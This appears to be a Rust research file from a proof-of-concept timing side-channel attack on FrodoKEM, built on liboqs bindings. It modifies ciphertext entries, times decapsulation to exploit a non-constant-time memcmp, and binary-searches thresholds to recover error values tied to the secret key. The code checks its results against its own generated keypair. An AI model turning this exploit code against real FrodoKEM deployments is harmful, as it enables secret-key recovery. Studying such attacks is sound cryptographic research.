use super::modify_and_measure::*;
use crate::attack::memcmp_frodo::profile::profile;
use crate::attack::memcmp_frodo::MeasureSource;
use crate::utils::Recorder;
use liboqs_rs_bindings as oqs;
use log::{debug, info, trace, warn};
use log_derive::logfn_inputs;
use oqs::frodokem::FrodoKem;
use oqs::frodokem::KemBuf;
use std::convert::TryInto;

#[logfn_inputs(Trace)]
fn search_modification<FRODO: FrodoKem>(
    index_ij: usize,
    iterations: usize,
    measure_source: &MeasureSource,
    short_circuit_threshold: u64,
    ciphertext: &mut FRODO::Ciphertext,
    shared_secret_d: &mut FRODO::SharedSecret,
    secret_key: &mut FRODO::SecretKey,
) -> Result<u16, String> {
    let maxmod = error_correction_limit::<FRODO>() * 2;
    let mut high = maxmod;
    let mut low = 0;
    let found = loop {
        let currentmod: u16 = ((high as usize + low as usize) / 2)
            .try_into()
            .map_err(|_| "overflow")?;
        trace!("high: {}, low: {}", high, low);
        debug!(
            "C[{}/{}] => Testing adding {} to C[{}] with {} iterations.",
            index_ij,
            FRODO::C::len() - 1,
            currentmod,
            index_ij,
            iterations
        );
        let time = mod_measure::<FRODO, _>(
            currentmod,
            index_ij,
            iterations,
            &measure_source,
            ciphertext,
            shared_secret_d,
            secret_key,
            &mut Recorder::medianval(format!("MEDIAN[{}]{{{}}}", index_ij, currentmod)),
        )?;

        debug!("time measurment is {}", time);
        if time >= short_circuit_threshold {
            debug!(
                "C[{}/{}] => +Raising lowerbound to {}",
                index_ij,
                FRODO::C::len() - 1,
                currentmod
            );
            low = currentmod;
        } else {
            debug!(
                "C[{}/{}] => -Lowering upperbound to {}",
                index_ij,
                FRODO::C::len() - 1,
                currentmod
            );
            high = currentmod;
        }
        if high - low == 1 {
            break low;
        }
    };
    if high == maxmod {
        warn!("Upper bound never changed, we might have missed the real threshold modification!");
    }
    if low == 0 {
        warn!("Lower bound never changed, we might have missed the real threshold modification!");
    }

    Ok(found)
}

#[logfn_inputs(Trace)]
pub fn crack_s<FRODO: FrodoKem>(
    warmup: usize,
    iterations: usize,
    profileiters: usize,
    measure_source: MeasureSource,
) -> Result<(), String> {
    #![allow(non_snake_case)]
    info!(
        "Launching the crack_s routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );
    let mut public_key = FRODO::PublicKey::new();
    let mut secret_key = FRODO::SecretKey::new();
    let mut ciphertext = FRODO::Ciphertext::new();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    let mut shared_secret_e = FRODO::SharedSecret::new();
    let mut shared_secret_d = FRODO::SharedSecret::new();

    let threshold = profile::<FRODO>(
        warmup,
        profileiters,
        measure_source,
        &mut public_key,
        &mut secret_key,
    )?;

    //let n = FRODO::params().PARAM_N;
    let nbar: usize = FRODO::params().PARAM_NBAR;
    let mbar = nbar;
    let err_corr_limit = error_correction_limit::<FRODO>();
    let nbr_encaps = 10;
    let i = mbar - 1;

    for t in 0..nbr_encaps {
        info!("Using encaps to generate ciphertext number: {}", t);
        FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;
        let expectedEppp = FRODO::calculate_Eppp(&mut ciphertext, &mut secret_key)?;
        let expectedEppp = expectedEppp.as_slice();

        for j in 0..nbar {
            // Modify ciphertext at C[nbar-1, j]
            let index = i * nbar + j;

            let x0 = search_modification::<FRODO>(
                index,
                iterations,
                &measure_source,
                threshold,
                &mut ciphertext,
                &mut shared_secret_d,
                &mut secret_key,
            )?;

            let Eppp_ij = err_corr_limit - x0;
            if Eppp_ij - 1 != expectedEppp[index] {
                warn!(
                    "Found -E'''[{},{}]={} expected: {}",
                    i, j, Eppp_ij, expectedEppp[index]
                )
            } else {
                info!(
                    "Found -E'''[{},{}]={} expected: {}",
                    i, j, Eppp_ij, expectedEppp[index]
                );
            }
        }
    }

    Ok(())
}
